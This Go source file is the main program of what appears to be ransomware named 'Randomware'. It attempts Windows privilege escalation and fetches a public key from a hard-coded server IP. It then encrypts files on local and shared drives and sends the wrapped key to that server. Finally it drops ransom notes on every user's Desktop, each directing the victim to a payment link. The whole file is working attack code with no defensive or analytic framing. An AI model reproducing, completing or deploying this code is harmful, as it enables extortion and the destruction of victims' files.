package main

import (
	//"Randomware/encryption"

	"Randomware/disk"
	"Randomware/encryption"
	"Randomware/encryption/keys"
	"Randomware/environment"
	"Randomware/file"
	"Randomware/security/privilege"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"time"
)

type ServerResponse struct {
	Id        string
	PublicKey string
}

// checkElevate : initializes the environment variables
func checkElevate() bool {
	_, err := os.Create("C:\\test.txt")
	return err == nil
}

func main() {
	exePath, err := os.Executable()

	if exePath == "C:\\Users\\peter\\go\\src\\Randomware\\Randomware.exe" {
		print("Safe zone !")
		os.Exit(-1)
	}

	if err != nil {
		log.Fatal(err)
	}

	args := os.Args
	if len(args) != 1 {
		switch args[1] {
		case "-e1":
			if checkElevate() {
				print("Admin")
				environment.SetupSafeFiles(true)
				if err != nil {
					print("Launch Failed")
					environment.SetupSafeFiles(false)
				}
			} else {
				print("User")
				environment.SetupSafeFiles(false)
			}
		case "-e2":
			environment.SetupSafeFiles(true)
		case "-c":
			environment.SetupSafeFiles(false)
		default:
			print("Bad argument")
			os.Exit(-2)
		}
	} else {
		if checkElevate() {
			environment.Setup(true)
		} else {
			environment.Setup(false)
			privilege.WindowsEscalate(environment.ExePath + " -e1")
			os.Exit(0)
		}
	}

	resp, err := http.Get("http://51.83.47.166/generate_key.php")

	for err != nil {
		time.Sleep(300 * time.Millisecond)
		resp, err = http.Get("http://51.83.47.166/generate_key.php")
	}

	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	//Convert the body to type string
	sb := string(body)

	var jsonData ServerResponse

	json.Unmarshal([]byte(sb), &jsonData)

	//File Encryption
	publicKey := keys.BytesToPublicKey([]byte(jsonData.PublicKey))

	//Encrypt file
	key := encryption.GenKey()
	keyBase64 := []byte(base64.StdEncoding.EncodeToString(*key))
	encryptedBase64Key := base64.StdEncoding.EncodeToString(keys.EncryptWithPublicKey(&keyBase64, publicKey))

	for _, shareDrive := range disk.Discover() {
		_, err := file.EncryptAll(shareDrive, key)
		if err != nil {
			log.Fatal(err)
		}
	}
	nbrFiles, err := file.EncryptAll(environment.EncryptionRootPath, key)
	if err != nil {
		log.Fatal(err)
	}

	_, err = http.PostForm("http://51.83.47.166/decrypt_key.php", url.Values{"key": {encryptedBase64Key}, "id": {jsonData.Id}})

	if err != nil {
		log.Fatal(err)
	}

	folders, err := file.DiscoverFolders("c:\\Users")

	if err != nil {
		log.Fatal(err)
	}

	var i int
	var f *os.File
	var textData []byte
	var textString string
	var helpFileName string

	for _, folder := range folders {
		i = 0
		for i <= 20 {
			helpFileName = fmt.Sprintf("%s\\Desktop\\IMPORTANT%d.txt", folder, i)
			f, err = os.Create(helpFileName)

			if err == nil {
				defer f.Close()
				textString = fmt.Sprintf("%d OF YOUR FILES HAVE BEEN COMPROMISED !!!!\nSTOP WHAT YOU ARE DOING RIGHT NOW!\n\nGo to this link http://51.83.47.166/web/pages/web/payment.php?id=%s and follow instructions.", nbrFiles, jsonData.Id)
				textData = []byte(textString)
				f.Write(textData)
				f.Sync()
			}
			i += 1
		}
	}
}
